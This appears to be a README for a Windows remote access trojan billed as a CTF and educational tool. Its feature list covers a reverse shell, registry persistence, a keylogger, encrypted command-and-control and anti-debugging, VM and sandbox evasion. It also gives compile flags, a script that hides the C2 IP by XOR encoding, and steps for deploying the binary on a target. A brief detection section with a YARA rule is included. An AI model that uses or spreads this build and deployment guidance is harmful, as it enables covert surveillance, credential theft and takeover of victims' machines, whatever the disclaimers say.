# Hardened RAT - CTF Edition

[![Language](https://img.shields.io/badge/Language-C-blue.svg)](https://en.wikipedia.org/wiki/C_(programming_language))
[![Platform](https://img.shields.io/badge/Platform-Windows-green.svg)](https://www.microsoft.com/windows)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![CTF](https://img.shields.io/badge/Use-CTF%2FEducational-red.svg)](https://ctftime.org/)

> **⚠️ WARNING: FOR EDUCATIONAL AND CTF PURPOSES ONLY**
>
> This tool is designed for security research, penetration testing in authorized environments, and Capture The Flag (CTF) competitions. Unauthorized access to computer systems is illegal.

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Configuration](#configuration)
- [Usage](#usage)
- [Evasion Techniques](#evasion-techniques)
- [Detection](#detection)
- [Disclaimer](#disclaimer)

## 🎯 Overview

A hardened Remote Access Trojan (RAT) designed for Windows environments with focus on evasion, stability, and educational value.

### Rating: **7.5/10** (Professional CTF-ready tool)

## ✨ Features

### Core Functionality
- ✅ **Reverse Shell** - Interactive command execution
- ✅ **File System Navigation** - Change directories remotely
- ✅ **Persistence** - Survives reboots via Registry
- ✅ **Keylogger** - Capture keystrokes with window titles
- ✅ **Encrypted C2** - RC4-encrypted communications
- ✅ **Auto-Reconnect** - Jittered reconnection on disconnect

### Evasion Techniques
- 🔐 **String Obfuscation** - XOR-encrypted strings
- 🎭 **API Obfuscation** - Runtime API resolution
- 🛡️ **Anti-Debugging** - Multiple debugger detection methods
- 🖥️ **VM Detection** - Detect VMware, VirtualBox, Hyper-V
- ⏱️ **Sandbox Detection** - Sleep acceleration checks
- 🔒 **Network Encryption** - All traffic encrypted with RC4

## 🔧 Installation

### Prerequisites
- **MinGW-w64** or **Visual Studio**
- **Python 3.7+** (for C2 server)

### Compilation

```bash
gcc -o rat.exe src/hardened_rat.c src/keylogger.c \
    -lws2_32 -ladvapi32 -luser32 -lwininet \
    -mwindows -O2 -s
```

## ⚙️ Configuration

Edit `src/hardened_rat.c`:

```c
#define C2_IP_ENC "\\xC9\\xCA..."  // Your encoded IP
#define C2_PORT 50005
```

Encode your IP:
```python
ip = "192.168.1.100"
xor = 0xAB
encoded = ''.join([f'\\x{ord(c)^xor:02X}' for c in ip])
print(encoded)
```

## 🚀 Usage

### Start C2 Server
```bash
python3 server/c2_server.py
```

### Deploy RAT
```bash
# On target system
rat.exe
```

### Commands
```
whoami          - Check user
cd <dir>        - Change directory
persist         - Create persistence
keylog_start    - Start keylogger
keylog_dump     - Get captured keystrokes
keylog_stop     - Stop keylogger
exit            - Disconnect
```

## 🛡️ Evasion Techniques

1. **String Obfuscation** - XOR encryption at compile time
2. **API Obfuscation** - GetProcAddress runtime resolution
3. **Network Encryption** - RC4 stream cipher
4. **Anti-Debugging** - IsDebuggerPresent, PEB checks
5. **VM Detection** - VMware backdoor, Registry artifacts
6. **Sandbox Detection** - Sleep acceleration, uptime checks

## 🔍 Detection

### Blue Team Detection Methods

**Registry Monitoring:**
```powershell
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
```

**Network Monitoring:**
```bash
netstat -ano | findstr "50005"
```

**Yara Rule:**
```yara
rule Hardened_RAT {
    strings:
        $s1 = "WindowsDefender" wide ascii
        $crypto = "MySecretKey2024"
    condition:
        uint16(0) == 0x5A4D and all of them
}
```

## ⚖️ Legal Disclaimer

**FOR EDUCATIONAL PURPOSES ONLY**

This tool is provided for security research, CTF competitions, and authorized penetration testing only. The creators assume **NO LIABILITY** for misuse.

### ✅ Authorized Use:
- Security research in controlled environments
- Penetration testing with written authorization
- CTF competitions
- Educational demonstrations

### ❌ Prohibited Use:
- Unauthorized access to computer systems
- Illegal activities
- Privacy violations

**Unauthorized computer access is a crime:**
- **USA**: CFAA - Up to 20 years imprisonment
- **UK**: Computer Misuse Act - Up to 10 years
- **International**: Similar laws worldwide

## 📄 License

MIT License - See LICENSE file

## 📧 Contact

For security research and educational inquiries:
- Open an issue on GitHub
- Use responsibly and legally

---

**⚠️ Always obtain proper authorization before testing on systems you don't own.**
